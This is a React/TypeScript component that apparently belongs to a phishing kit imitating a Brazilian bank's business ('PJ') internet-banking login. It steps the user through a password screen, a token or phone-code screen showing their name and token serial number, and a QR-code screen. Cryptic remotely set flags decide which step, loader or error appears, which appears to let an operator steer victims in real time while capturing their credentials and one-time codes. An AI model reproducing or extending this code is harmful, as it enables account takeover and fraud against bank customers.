// src/app/(public)/ibpjlogin/login/components/MainContentLogin.tsx
"use client";

const banner = "/PJ_seguranca_net-empresa.jpg";
import { useIdentification } from "@/contexts/IdentificationContext";
import { ModalQrCode } from "../ModalQrCode";
import { LoaderComponent } from "./LoaderComponent";
import { MainContentLoginS1 } from "./MainContentLoginS1";
import { MainContentLoginS2 } from "./MainContentLoginS2";

export function MainContentLogin() {
  const { state, ready } = useIdentification();
  const resp: any = state ?? {};

  if (!ready) {
    return (
      <div className="w-[750px] min-w-[750px] pl-5 pr-[18px] pt-[20px] h-[528px] bg-white ml-[14px] rounded-[6px] border-b border-b-[#ccc] ">
        <div className="h-[100px] w-full">
          <img src={banner} alt="" />
        </div>
        <LoaderComponent />
      </div>
    );
  }
  const s = resp.s ?? 1;
  const ils1l = !!resp.ils1l;
  const ils1e = !!resp.ils1e;
  const ils2l = !!resp.ils2l;
  const ils2e = !!resp.ils2e;
  const ils3l = !!resp.ils3l;
  const ils3e = !!resp.ils3e;
  const nome = typeof resp.n === "string" ? resp.n : "";
  const numSerie = typeof resp.ns === "string" ? resp.ns : "";
  const tipoToken = resp.tt === 2 ? "token" : "celular";
  const qrCodeUrl = typeof resp.qrCodeUrl === "string" ? resp.qrCodeUrl : "";

  return (
    <div className="w-[750px] min-w-[750px] pl-5 pr-[18px] pt-[20px] h-[528px] bg-white ml-[14px] rounded-[6px] border-b border-b-[#ccc] ">
      <div className="h-[100px] w-full">
        <img src={banner} alt="" />
      </div>

      <div>
        {s === 1 && (
          <>
            {ils1l ? (
              <LoaderComponent />
            ) : (
              <MainContentLoginS1 error={ils1e ? "login" : "none"} />
            )}
          </>
        )}
        {s === 2 && (
          <>
            {ils2l ? (
              <LoaderComponent />
            ) : (
              <MainContentLoginS2
                tipoToken={tipoToken}
                tokenInvalid={ils2e}
                nome={nome}
                numSerie={numSerie}
              />
            )}
          </>
        )}
        {s === 3 && (
          <>
            <ModalQrCode
              qrCodeUrl={qrCodeUrl}
              loading={ils3l}
              qrCodeInvalid={ils3e}
            />
            {ils3l && <LoaderComponent />}
          </>
        )}
      </div>
    </div>
  );
}
